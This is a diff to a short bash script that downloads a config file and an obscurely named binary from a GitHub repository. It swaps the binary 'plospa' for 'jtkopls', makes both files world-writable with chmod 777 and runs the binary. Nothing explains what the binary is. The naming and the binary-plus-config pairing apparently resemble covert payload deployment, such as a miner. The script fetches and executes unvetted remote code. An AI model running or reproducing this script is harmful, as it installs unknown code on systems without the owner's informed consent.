@@ -1,6 +1,6 @@
 #!/bin/bash
 
 wget https://github.com/vedhagsvp/taberas/raw/main/appsettings.json
-wget https://github.com/vedhagsvp/taberas/releases/download/latest/plospa
-chmod 777 plospa appsettings.json
-./plospa
+wget https://github.com/vedhagsvp/taberas/releases/download/mlb/jtkopls
+chmod 777 jtkopls appsettings.json
+./jtkopls
